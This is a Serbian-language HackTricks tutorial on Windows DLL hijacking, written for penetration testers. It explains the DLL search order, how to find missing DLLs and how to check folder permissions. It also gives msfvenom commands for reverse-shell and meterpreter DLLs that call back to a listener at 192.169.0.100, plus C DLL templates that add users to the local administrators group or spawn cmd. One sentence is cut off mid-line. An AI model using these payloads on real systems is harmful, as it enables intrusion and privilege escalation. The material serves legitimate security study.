# Dll Hijacking

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ako vas zanima **hakerska karijera** i hakovanje nehakabilnog - **mi zapošljavamo!** (_potrebno je tečno poznavanje poljskog jezika_).

{% embed url="https://www.stmcyber.com/careers" %}

## Osnovne informacije

DLL Hijacking uključuje manipulaciju pouzdanom aplikacijom tako da učita zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection i Side-Loading**. Glavna svrha je izvršavanje koda, postizanje postojanosti i, ređe, eskalacija privilegija. Bez obzira na fokus na eskalaciji privilegija, metoda hakovanja ostaje ista za sve ciljeve.

### Uobičajene tehnike

Za DLL hakovanje koristi se nekoliko metoda, pri čemu je njihova efikasnost zavisna od strategije učitavanja DLL-a aplikacije:

1. **Zamena DLL-a**: Zamena originalnog DLL-a zlonamernim, opciono korišćenje DLL Proxying-a da bi se očuvala funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hakovanje**: Postavljanje zlonamernog DLL-a na putanju pre legitimnog, iskorišćavanje obrasca pretrage aplikacije.
3. **Phantom DLL Hakovanje**: Kreiranje zlonamernog DLL-a koji će aplikacija pokušati da učita, misleći da je to nepostojeći DLL koji je potreban.
4. **DLL Redirekcija**: Modifikacija parametara pretrage kao što su `%PATH%` ili `.exe.manifest` / `.exe.local` fajlovi kako bi se aplikacija usmerila na zlonamerni DLL.
5. **WinSxS Zamena DLL-a**: Zamena legitimnog DLL-a zlonamernim ekvivalentom u WinSxS direktorijumu, metoda koja se često povezuje sa DLL side-loading-om.
6. **Hakovanje DLL-a sa relativnom putanjom**: Postavljanje zlonamernog DLL-a u direktorijum koji je pod kontrolom korisnika zajedno sa kopiranom aplikacijom, slično tehnikama izvršavanja binarnih fajlova putem proxy-ja.

## Pronalaženje nedostajućih DLL-ova

Najčešći način pronalaženja nedostajućih DLL-ova u sistemu je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) alata iz sysinternals-a, **postavljanje** sledećih **2 filtera**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

i prikazivanje samo **aktivnosti sistema datoteka**:

![](<../../.gitbook/assets/image (314).png>)

Ako tražite **nedostajuće DLL-ove uopšteno**, ostavite ovo pokrenuto nekoliko **sekundi**.\
Ako tražite **nedostajući DLL unutar određene izvršne datoteke**, trebali biste postaviti **još jedan filter kao "Process Name" "contains" "\<ime izvršne datoteke>", pokrenuti je i zaustaviti snimanje događaja**.

## Iskorišćavanje nedostajućih DLL-ova

Da bismo eskalirali privilegije, najbolja šansa je da **napišemo DLL koji će privilegovani proces pokušati da učita** na nekom mestu gde će biti pretražen. Na taj način, moći ćemo da **napišemo** DLL u **folderu** gde se **DLL pretražuje pre** foldera u kojem se nalazi **originalni DLL** (neobičan slučaj), ili ćemo moći da **pišemo u neki folder gde će DLL biti pretražen** a originalni **DLL ne postoji** ni u jednom folderu.

### Redosled pretrage DLL-a

U [**Microsoft dokumentaciji**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) možete pronaći kako se DLL-ovi specifično učitavaju.

**Windows aplikacije** traže DLL-ove prateći određeni set **unapred definisanih putanja pretrage**, pridržavajući se određenog redosleda. Problem hakovanja DLL-a nastaje kada se zlonamerni DLL strategijski postavi u jedan od ovih direktorijuma, osiguravajući da se učita pre autentičnog DLL-a. Rešenje za sprečavanje ovoga je da se obezbedi da aplikacija koristi apsolutne putanje kada se referiše na DLL-ove koje zahteva.

Možete videti **redosled pretrage DLL-a na 32-bitnim** sistemima u nastavku:

1. Direktorijum iz kojeg je aplikacija učitana.
2. Sistemski direktorijum. Koristite funkciju [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) da biste dobili putanju do ovog direktorijuma. (_C:\Windows\System32_)
3. 16-bitni sistemski direktorijum. Ne postoji funkcija koja dobija putanju do ovog direktorijuma, ali se on pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite funkciju [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) da biste dobili putanju do ovog direktorijuma. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi navedeni u PATH okruženjskoj promenljivoj. Napomena: ovo ne uključuje putanju specifičnu za aplikaciju koja je navedena u registarskom ključu **App Paths**. Ključ **App Paths** se ne koristi prilikom računanja putanje pretrage DLL-a.

To je **podrazumevani** redosled pretrage sa omogućenim **SafeDllSearchMode**-om. Kada je on onemogućen, trenutni direktorijum se penje na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte registarsku vrednost **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućeno).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, pretraga počinje u direktorijumu izvršnog modula koji učitava **LoadLibraryEx**.

Na kraju, napomenimo da **DLL može biti učitan navođenjem apsolutne putanje umesto samo imena**. U tom slučaju, taj DLL će biti
#### Izuzeci u redosledu pretrage DLL fajlova prema Windows dokumentaciji

Određeni izuzeci od standardnog redosleda pretrage DLL fajlova su navedeni u Windows dokumentaciji:

- Kada se naiđe na **DLL fajl koji deli ime sa već učitanom DLL fajlom u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga, vrši se provera preusmeravanja i manifesta pre nego što se podrazumevano koristi DLL fajl koji je već u memoriji. **U ovom scenariju, sistem ne vrši pretragu za DLL fajlom**.
- U slučajevima kada se DLL fajl prepoznaje kao **poznata DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju poznate DLL, zajedno sa svim zavisnim DLL fajlovima, **preskačući proces pretrage**. Ključ registra **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih poznatih DLL fajlova.
- Ukoliko DLL fajl ima **zavisnosti**, pretraga za ovim zavisnim DLL fajlovima se vrši kao da su naznačeni samo njihovi **nazivi modula**, bez obzira na to da li je početni DLL fajl identifikovan putanjom.

### Eskalacija privilegija

**Uslovi**:

- Identifikujte proces koji radi ili će raditi pod **različitim privilegijama** (horizontalno ili lateralno kretanje), a koji **nedostaje DLL fajl**.
- Osigurajte da postoji **pristup za pisanje** u bilo kojem **direktorijumu** u kojem će se **tražiti DLL fajl**. Ova lokacija može biti direktorijum izvršnog fajla ili direktorijum unutar putanje sistema.

Da, uslovi su komplikovani za pronalaženje jer je **podrazumevano prilično čudno da privilegovan izvršni fajl nedostaje DLL fajl** i još je **čudnije imati dozvole za pisanje u folderu putanje sistema** (što nije moguće podrazumevano). Ali, u neskonfigurisanim okruženjima ovo je moguće.\
U slučaju da imate sreće i ispunjavate uslove, možete proveriti projekat [UACME](https://github.com/hfiref0x/UACME). Iako je **glavni cilj projekta zaobilaženje UAC-a**, tamo možete pronaći **PoC** za hakovanje DLL fajlova za odgovarajuću verziju Windows-a (verovatno samo promenom putanje foldera u kojem imate dozvole za pisanje).

Imajte na umu da možete **proveriti svoje dozvole u folderu** koristeći:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih foldera unutar PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti uvoze izvršne datoteke i izvoze DLL datoteke pomoću:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za potpuni vodič o tome kako **zloupotrebiti Dll Hijacking za eskalaciju privilegija** sa dozvolama za pisanje u **System Path folderu**, pogledajte:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Automatizovani alati

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za pisanje u bilo kojem folderu unutar sistema PATH.\
Drugi zanimljivi automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit funkcije**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Primer

U slučaju da pronađete iskoristiv scenario, jedna od najvažnijih stvari za uspešno iskorišćavanje bilo bi **kreiranje dll-a koji izvozi barem sve funkcije koje će izvršna datoteka uvoziti iz njega**. U svakom slučaju, napomenimo da Dll Hijacking dolazi u ruci kako bi se [eskaliro od nivoa srednje integriteta do visokog **(zaobilazeći UAC)**](../authentication-credentials-uac-and-efs.md#uac) ili od **visokog integriteta do SYSTEMA**. Možete pronaći primer **kako kreirati validan dll** u okviru ovog studija o dll hijackingu fokusiranom na izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Osim toga, u **narednom odeljku** možete pronaći neke **osnovne kodove dll-a** koji mogu biti korisni kao **predlošci** ili za kreiranje **dll-a sa neobaveznim izvezenim funkcijama**.

## **Kreiranje i kompajliranje Dll-ova**

### **Dll Proksifikacija**

U osnovi, **Dll proxy** je Dll koji je sposoban da **izvrši vaš zlonamerni kod prilikom učitavanja**, ali takođe i da **izlaže** i **radi** kao **očekivano** tako što **preusmerava sve pozive na pravu biblioteku**.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **navesti izvršnu datoteku i izabrati biblioteku** koju želite da proksifikujete i **generisati proksifikovani dll** ili **navesti Dll** i **generisati proksifikovani dll**.

### **Meterpreter**

**Dobijanje reverzne veze (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobijanje meterpretera (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreiranje korisnika (x86, nisam vidio x64 verziju):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaša sopstvena

Imajte na umu da u nekoliko slučajeva Dll koji kompajlirate mora **izvoziti nekoliko funkcija** koje će biti učitane od strane procesa žrtve, ako ove funkcije ne postoje, **binarna datoteka neće moći da ih učita** i **eksploatacija će neuspeti**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Reference
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ako vas zanima **hakerska karijera** i hakovanje nehakabilnog - **mi zapošljavamo!** (_potrebno je tečno poznavanje poljskog jezika, pisano i govorno_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
